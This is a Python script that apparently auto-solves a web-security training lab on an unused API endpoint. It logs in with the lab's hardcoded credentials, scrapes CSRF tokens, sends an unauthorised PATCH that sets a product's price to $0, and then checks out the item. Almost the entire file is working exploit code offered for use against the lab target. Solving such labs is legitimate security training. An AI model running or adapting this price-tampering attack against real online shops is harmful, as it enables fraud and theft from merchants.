import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Finding and exploiting an unused API endpoint"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page\n2. Extract the csrf token and session cookie\n3. Login as wiener\n4. Make the leather jacket price equal to $0\n5. Add the leather jacket to the cart\n6. Fetch wiener's cart\n7. Extract the csrf token needed for placing order\n8. Place order\n9. Confirm order\n""")

    print(Fore.WHITE + "[1] Fetching the login page")
    login_page = requests.get(
        f"{url}/login", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting the csrf token and session cookie")
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    print(Fore.GREEN + "CSRF token" + Fore.WHITE +
          " => " + Fore.YELLOW + csrf_token)

    print(Fore.WHITE +
          "[3] Logging in as wiener")
    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    wiener_login = requests.post(
        f"{url}/login", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[4] Making the leather jacket price equal to $0")
    session = wiener_login.cookies.get("session")
    cookies = { "session": session }
    json = { "price": 0 }
    requests.patch(
        f"{url}/api/products/1/price", json=json, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[5] Adding the leather jacket to the cart")
    data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
    requests.post(
        f"{url}/cart", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[6] Fetching wiener's cart")
    wiener_cart = requests.get(
        f"{url}/cart", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[7] Extracting the csrf token needed for placing order")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_cart.text)[0]

    print(Fore.WHITE + "[8] Placing order")
    data = {"csrf": csrf_token}
    requests.post(
        f"{url}/cart/checkout", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[9] Confirming order")

    try:
        r = requests.get(
            f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
